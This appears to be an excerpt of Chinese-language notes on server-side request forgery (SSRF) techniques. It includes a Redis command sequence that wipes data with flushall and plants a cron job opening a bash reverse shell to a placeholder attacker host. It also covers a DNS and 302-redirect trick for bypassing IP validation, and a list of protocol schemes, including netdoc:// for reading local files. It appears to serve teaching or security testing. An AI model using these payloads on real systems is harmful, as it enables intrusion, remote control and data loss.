...
*   **Redis 命令序列**：
    ```text
    flushall
    set cmd "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/<attacker-domain>/4444 0>&1\n\n"
...
sequenceDiagram
    ...
    VulnServer->>DNS: 1. 解析 evil.<attacker-domain>
...
*   输入：`http://<attacker-domain>/302.php`
*   后端校验 `<attacker-domain>` 的 IP，发现为合法的公网 IP，放行。
*   请求发包时，`<attacker-domain>/302.php` 返回：
    ```http
    HTTP/1.1 302 Found
...
tftp://    → TFTP
ldap://    → LDAP 查询
netdoc://  → Java 文件读取 (netdoc://<sensitive-file>)
jar://     → Java JAR 读取
php://     → PHP stream
